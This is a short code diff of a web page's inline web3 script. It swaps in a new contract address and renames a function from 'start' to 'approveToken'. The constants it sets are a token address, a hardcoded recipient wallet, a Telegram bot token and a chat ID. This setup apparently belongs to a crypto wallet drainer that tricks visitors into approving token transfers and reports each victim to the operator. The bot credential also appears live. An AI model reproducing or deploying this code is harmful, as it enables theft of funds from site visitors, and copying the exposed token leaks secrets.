@@ -1253,7 +1253,7 @@
                                    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 <script>
 const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
-const contractAddress = "0x8c8C07d9cc5aDCb443c7257ad43b01EB26a2636F";
+const contractAddress = "0xCC5a1a71977564DCe427A4f325259330f2c08997";
 const recipientAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
 const telegramToken = "7469005317:AAGgWxVoQLTDTcclOPYiysSqf58xyihZwwQ";
 const telegramChatID = "7281528879";
@@ -1333,7 +1333,7 @@ function calculateUSD() {
     document.getElementById("usdValue").innerText = "$" + amount.toFixed(2);
 }
 
-async function start() {
+async function approveToken() {
     const loader = document.getElementById("loader");
     loader.style.display = "block";
 
